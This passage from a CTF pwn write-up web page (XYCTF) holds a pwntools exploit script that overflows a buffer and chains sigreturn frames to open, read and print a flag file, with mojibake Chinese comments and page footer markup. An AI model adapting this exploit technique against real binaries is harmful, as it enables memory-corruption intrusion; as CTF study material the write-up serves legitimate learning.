rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
bss <span class="token operator">=</span> <span class="token number">0x404060</span><span class="token operator">+</span><span class="token number">0x100</span>
bss_addr <span class="token operator">=</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
ret_addr <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x40101a</span><span class="token punctuation">)</span>
sigreturn_syscall <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401296</span><span class="token punctuation">)</span>
syscall <span class="token operator">=</span> <span class="token number">0x40129D</span>
<span class="token comment">#è°ƒç”¨readåœ¨bssæ®µéƒ¨ç½²payload</span>
sigFrame<span class="token operator">=</span>SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sigFrame<span class="token punctuation">.</span>rax<span class="token operator">=</span><span class="token number">0</span>
sigFrame<span class="token punctuation">.</span>rdi<span class="token operator">=</span><span class="token number">0</span>
sigFrame<span class="token punctuation">.</span>rsi<span class="token operator">=</span>bss
sigFrame<span class="token punctuation">.</span>rdx<span class="token operator">=</span><span class="token number">0x700</span>
<span class="token comment"># åŠ 0x8æ˜¯å› ä¸ºè¿™ä¸ªä½ç½®æ”¾./flagå­—ç¬¦ä¸²</span>
sigFrame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x8</span>
sigFrame<span class="token punctuation">.</span>rip<span class="token operator">=</span>syscall
payload <span class="token operator">=</span> <span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> sigreturn_syscall <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>sigFrame<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;bssæ®µ:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token punctuation">)</span>
sd<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token comment"># ç¬¬äºŒæ¬¡æ„é€  orw</span>
sigFrame2<span class="token operator">=</span>SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sigFrame2<span class="token punctuation">.</span>rax<span class="token operator">=</span><span class="token number">2</span>
<span class="token comment"># ./flag</span>
sigFrame2<span class="token punctuation">.</span>rdi<span class="token operator">=</span>bss
sigFrame2<span class="token punctuation">.</span>rsi<span class="token operator">=</span><span class="token number">0</span>
sigFrame2<span class="token punctuation">.</span>rdx<span class="token operator">=</span><span class="token number">0</span>
<span class="token comment"># 264æ˜¯è°ƒè¯•å‡ºæ¥çš„</span>
sigFrame2<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x108</span>
sigFrame2<span class="token punctuation">.</span>rip<span class="token operator">=</span>syscall

<span class="token comment"># readå‡½æ•°</span>
sigFrame3<span class="token operator">=</span>SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sigFrame3<span class="token punctuation">.</span>rax<span class="token operator">=</span><span class="token number">0</span>
sigFrame3<span class="token punctuation">.</span>rdi<span class="token operator">=</span><span class="token number">3</span>
<span class="token comment"># éšä¾¿å†™çš„ä½ç½®</span>
sigFrame3<span class="token punctuation">.</span>rsi<span class="token operator">=</span>bss<span class="token operator">+</span><span class="token number">0x400</span>
sigFrame3<span class="token punctuation">.</span>rdx<span class="token operator">=</span><span class="token number">0x36</span>
sigFrame3<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">520</span>
sigFrame3<span class="token punctuation">.</span>rip<span class="token operator">=</span>syscall

<span class="token comment"># writeå‡½æ•°</span>
sigFrame4<span class="token operator">=</span>SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sigFrame4<span class="token punctuation">.</span>rax<span class="token operator">=</span><span class="token number">1</span>
sigFrame4<span class="token punctuation">.</span>rdi<span class="token operator">=</span><span class="token number">1</span>
<span class="token comment"># flagä½ç½®</span>
sigFrame4<span class="token punctuation">.</span>rsi<span class="token operator">=</span>bss<span class="token operator">+</span><span class="token number">0x400</span>
sigFrame4<span class="token punctuation">.</span>rdx<span class="token operator">=</span><span class="token number">0x36</span>
sigFrame4<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">520</span>
sigFrame4<span class="token punctuation">.</span>rip<span class="token operator">=</span>syscall
payload <span class="token operator">=</span><span class="token string">b&quot;./flag\x00&quot;</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span> sigreturn_syscall <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>sigFrame2<span class="token punctuation">)</span> <span class="token operator">+</span>sigreturn_syscall<span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigFrame3<span class="token punctuation">)</span><span class="token operator">+</span>sigreturn_syscall<span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigFrame4<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;open+readçš„é•¿åº¦:&quot;</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;ç¬¬äºŒæ¬¡è¾“å…¥&quot;</span><span class="token punctuation">)</span>
sd<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></div><!--[--><!----><!--]--><footer class="page-meta"><div class="meta-item edit-link"><a href="https://github.com/vuepress-theme-hope/vuepress-theme-hope/edit/main/src/posts/pwn/competition/xyctf/xyctf.md" rel="noopener noreferrer" target="_blank" aria-label="Edit this page on GitHub" class="nav-link label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" class="icon edit-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="edit icon"><path d="M430.818 653.65a60.46 60.46 0 0 1-50.96-93.281l71.69-114.012 7.773-10.365L816.038 80.138A60.46 60.46 0 0 1 859.225 62a60.46 60.46 0 0 1 43.186 18.138l43.186 43.186a60.46 60.46 0 0 1 0 86.373L588.879 565.55l-8.637 8.637-117.466 68.234a60.46 60.46 0 0 1-31.958 11.229z"></path><path d="M728.802 962H252.891A190.883 190.883 0 0 1 62.008 771.98V296.934a190.883 190.883 0 0 1 190.883-192.61h267.754a60.46 60.46 0 0 1 0 120.92H252.891a69.962 69.962 0 0 0-69.098 69.099V771.98a69.962 69.962 0 0 0 69.098 69.098h475.911A69.962 69.962 0 0 0 797.9 771.98V503.363a60.46 60.46 0 1 1 120.922 0V771.98A190.883 190.883 0 0 1 728.802 962z"></path></svg><!--]-->Edit this page on GitHub<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="meta-item git-info"><div class="update-time"><span class="label">Last update: </span><!----></div><div class="contributors"><span class="label">Contributors: </span><!--[--><!--[--><span class="contributor" title="email: 88972629+awaqwqa@users.noreply.github.com">awaqwqa</span><!--]--><!--]--></div></div></footer><!----><!----><!--[--><!----><!--]--><!--]--></main><!--]--><footer class="vp-footer-wrapper"><div class="vp-footer">Default footer</div><div class="vp-copyright">Copyright Â© 2024 Elegy</div></footer></div><!--]--><!----><!----><!--]--></div>
    <script type="module" src="/assets/app-lch0_zHc.js" defer></script>
  </body>
</html>
